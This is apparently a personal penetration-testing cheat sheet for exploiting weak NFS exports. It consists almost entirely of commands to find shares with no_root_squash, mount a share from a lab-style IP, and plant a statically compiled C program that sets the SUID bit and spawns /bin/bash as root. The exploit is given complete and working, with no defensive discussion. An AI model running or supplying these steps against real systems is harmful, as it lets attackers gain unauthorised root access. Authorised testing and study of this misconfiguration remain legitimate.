# Weak NFS Permissions
```powershell
python3 nfscaner.py 192.168.1.0/24 ( Personal Tool )

showmount -e 10.129.2.12

no_root_squash --> DANGEROUS

cat /etc/exports

shell.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>
int main(void)
{setuid(0); setgid(0); system("/bin/bash");}

gcc -static shell.c -o shell

mount -t nfs 10.129.2.12:/tmp /mnt
cp shell /mnt
chmod u+s /mnt/shell

./shell
```
